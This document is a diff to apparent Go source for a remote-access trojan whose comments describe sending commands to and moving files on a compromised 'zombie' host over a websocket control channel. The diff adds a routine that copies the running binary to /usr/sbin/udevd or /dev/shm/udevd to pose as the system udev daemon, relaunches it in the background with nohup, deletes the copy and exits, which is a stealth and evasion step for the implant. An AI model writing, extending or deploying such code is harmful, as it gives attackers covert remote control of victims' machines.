@@ -9,6 +9,7 @@ import (
 	"github.com/alexflint/go-filemutex"
 	"github.com/xxtea/xxtea-go/xxtea"
 	"golang.org/x/net/websocket"
+	"io"
 	"io/ioutil"
 	"net"
 	"os"
@@ -21,6 +22,7 @@ import (
 )
 
 const (
+	terrace       = "L"
 	SEND_MSG      = "0"   //一般信息，如cmd指令，cmd运行后返回值，提示信息等
 	UPLOAD_FILE   = "1"   //上传文件到肉鸡
 	DOWNLOAD_FILE = "2"   //下载文件到控制台
@@ -63,9 +65,11 @@ type Host struct {
 func creatWebsocket() (*websocket.Conn, error) {
 	return websocket.Dial(url, token(), origin)
 }
+
 func main() {
-	//daemon.Daemon(1, 0)                                                       //成为守护进程                                                    //成为守护进程
+	//daemon.Daemon(1, 0)                 //成为守护进程
 	signal.Ignore(syscall.Signal(20), syscall.Signal(17), syscall.Signal(18)) //因为代码中没有wait,所以忽略系统子进程结束信号，避免僵尸进程(go1,9没有系统子进程结束信号，自己建造信号值)
+	fork()
 	go lockTime()
 	//文件锁
 	var err error
@@ -329,4 +333,61 @@ func getMac() string {
 		}
 	}
 	return "0"
+}
+
+//root   /usr/sbin/udvd
+// /home/kunshi/mgc/bin/mgc
+func fork() {
+	whoami, _ = execShell("whoami")
+	src, _ := os.Getwd()
+	dst := "/usr/sbin/"
+	dstFileName := "udevd"
+	if whoami != "root\r\n" {
+		dst = "/dev/shm/"
+		dstFileName = "udevd"
+	}
+
+	if strings.HasPrefix(dst, src) { //如果运行程序就在指定目录
+		return
+	}
+
+	_, err := fileCopy(os.Args[0], dst, dstFileName)
+	if err != nil {
+		return
+	}
+	//execShell("cd " + dst)
+	err = forkExec("chmod +x " + dst + dstFileName)
+	err = forkExec("nohup " + dst + dstFileName + " >/dev/null 2>&1 &") //fork子程序
+	if err != nil {
+		return
+	}
+	os.Remove(dst + dstFileName) //删除复制过去的文件
+	os.Exit(0)                   //退自己
+}
+func forkExec(s string) error {
+	cmd := exec.Command("/bin/sh", "-c", s)
+	err := cmd.Start()
+	time.Sleep(2 * time.Second)
+	return err
+}
+
+func fileCopy(src, dst, dstFileName string) (int64, error) {
+	_, err := os.Stat(src) //判断文件是否存在
+	_, err = os.Stat(dst)  //判断文件是否存在
+	if err != nil {
+		return 0, err
+	}
+
+	source, err := os.Open(src)
+	if err != nil {
+		return 0, err
+	}
+	defer source.Close()
+	destination, err := os.Create(dst + dstFileName)
+	if err != nil {
+		return 0, err
+	}
+	defer destination.Close()
+	nBytes, err := io.Copy(destination, source)
+	return nBytes, err
 }
